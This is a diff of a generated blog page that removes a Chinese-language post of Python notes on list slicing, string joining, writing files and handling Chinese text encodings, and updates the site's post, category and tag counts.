-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list[<span class="number">1</span>:]     <span class="comment"># 注意区间是前闭后开的，取第二个元素到最后一个元素</span></span><br><span class="line">list[:<span class="number">-1</span>]    <span class="comment"># -1表示倒数第一个元素，但区间是前闭后开的，因而取第一个元素和倒数第二个元素</span></span><br></pre></td></tr></table></figure>
-<h2 id="list重新转化为字符串"><a href="#list重新转化为字符串" class="headerlink" title="list重新转化为字符串"></a>list重新转化为字符串</h2><p>处理完list之后，我们需要将list再次组合成字符串</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_str = <span class="string">''</span>.join(lst)      <span class="comment"># 通过空字符串连接list元素，即直接拼接成新的字符串</span></span><br><span class="line">new_str = os.sep.join(lst)    <span class="comment"># 连接成目录</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="写入文本"><a href="#写入文本" class="headerlink" title="写入文本"></a>写入文本</h1><p>两种方式，一种即正常的write()方法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(path, <span class="string">'w'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(<span class="string">'123'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>或者通过修改标准输出到文件来写入文件：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">origin = sys.stdout</span><br><span class="line">fp = open(path, <span class="string">'w'</span>)</span><br><span class="line">sys.stdout = fp</span><br><span class="line"></span><br><span class="line">sys.stdout = origin</span><br><span class="line">fp.close()</span><br></pre></td></tr></table></figure>
-<p>明显第二种方式更加优雅，且可以很方便的从输出到屏幕到写入文件进行转换</p>
-<p>转载和引用：<br><a href="https://www.cnblogs.com/zywscq/p/5441145.html" target="_blank" rel="noopener">cnblog</a><br><a href="https://www.cnblogs.com/Yolandera/p/7257595.html" target="_blank" rel="noopener">cnblog</a></p>
-<h1 id="中文处理"><a href="#中文处理" class="headerlink" title="中文处理"></a>中文处理</h1><h2 id="ascii编码转换为utf-8"><a href="#ascii编码转换为utf-8" class="headerlink" title="ascii编码转换为utf-8"></a>ascii编码转换为utf-8</h2><p>python2.x中默认编码方式为ascii，若文本出现非ascii编码字符会报错,因而需要设置编码格式</p>
-<h3 id="python2-x"><a href="#python2-x" class="headerlink" title="python2.x"></a>python2.x</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#coding:utf-8                              # 代码编辑中可出现中文</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">reload(sys)                               </span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)           <span class="comment"># 编码转换</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="python3-x"><a href="#python3-x" class="headerlink" title="python3.x"></a>python3.x</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(file, <span class="string">'r'</span>, errors=<span class="string">'ignore'</span>) <span class="keyword">as</span> fp:      <span class="comment"># 直接忽略无法编码的乱码报错，可用于打开夹带有可识别字符串的二进制文件</span></span><br></pre></td></tr></table></figure>
-
-<p>python3.x中不需要指定编码格式即可处理utf-8,但如果仍要转换格式，也可以</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#coding:utf-8                              # 代码编辑中可出现中文</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"></span><br><span class="line">importlib.reload(sys)                      <span class="comment"># 编码转换</span></span><br></pre></td></tr></table></figure>
-<h2 id="中文路径及文件名"><a href="#中文路径及文件名" class="headerlink" title="中文路径及文件名"></a>中文路径及文件名</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">path = <span class="string">r'D:\测试路径\测试文件.txt'</span>           <span class="comment"># r''用于处理python中的转义符'\'，若不使用r''则需要每个转义符'\'前再次转义即'\\'</span></span><br><span class="line">path = <span class="string">'D:\\测试路径\\测试文件.txt'</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="读取中文文本内容"><a href="#读取中文文本内容" class="headerlink" title="读取中文文本内容"></a>读取中文文本内容</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># py3</span></span><br><span class="line"><span class="keyword">with</span> open(test.txt, <span class="string">'r'</span>, encoding=<span class="string">'utf8'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    lines = fp.readlines()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1148,18 +1124,18 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">21</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
